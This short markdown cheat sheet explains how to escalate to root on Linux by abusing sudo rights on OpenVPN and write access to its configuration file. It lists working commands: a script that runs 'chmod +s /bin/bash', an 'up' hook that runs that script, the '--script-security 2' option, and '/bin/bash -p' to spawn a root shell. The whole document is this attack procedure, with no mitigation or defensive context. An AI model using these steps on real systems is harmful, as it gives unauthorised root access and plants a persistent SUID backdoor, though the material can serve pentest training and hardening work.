# REQUIREMENTS:

### 1) Sudo privileges on OpenVPN binary

### 2) Write Privileges on OpenVPN configuration file

## STEPS:

#### 1) Create a script wherever you have write privileges: 

#### 2) Script contents: #!/bin/bash chmod +s /bin/bash

#### 3) In the configuration file, add a one-liner to execute script upon initialization: 

#### 4) up /home/USER/script.sh

#### 5) Run OpenVPN with sudo

#### 6) /bin/bash -p (Spawn root shell)

## TIP: If the script fails to execute, add another one liner above the one you added in the configuration file:

#### 7) --script-security 2
